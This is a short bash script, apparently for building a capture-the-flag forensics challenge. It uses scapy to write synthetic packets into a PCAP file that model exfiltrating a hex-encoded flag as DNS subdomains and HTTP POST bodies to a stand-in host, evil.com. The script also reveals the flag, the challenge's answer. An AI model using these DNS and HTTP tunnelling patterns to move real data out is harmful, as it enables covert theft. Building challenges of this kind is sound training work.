#!/bin/bash

cat > gen.py <<'EOF'
from scapy.all import *

packets = []

flag = "FLAG{dns_and_http}"
hexflag = flag.encode().hex()

chunks = [hexflag[i:i+8] for i in range(0, len(hexflag), 8)]

for i, c in enumerate(chunks):
    dns = IP(src="10.0.0.5", dst="8.8.8.8") / \
          UDP(dport=53) / \
          DNS(rd=1,qd=DNSQR(qname=f"{c}.evil.com"))
    packets.append(dns)

for i, c in enumerate(chunks):
    http = IP(src="10.0.0.5", dst="192.168.1.20") / \
           TCP(dport=80, sport=4444) / \
           Raw(load=f"POST / HTTP/1.1\r\nHost: evil.com\r\n\r\npart={c}")
    packets.append(http)

wrpcap("capture.pcap", packets)

print("PCAP generated")
EOF

python3 gen.py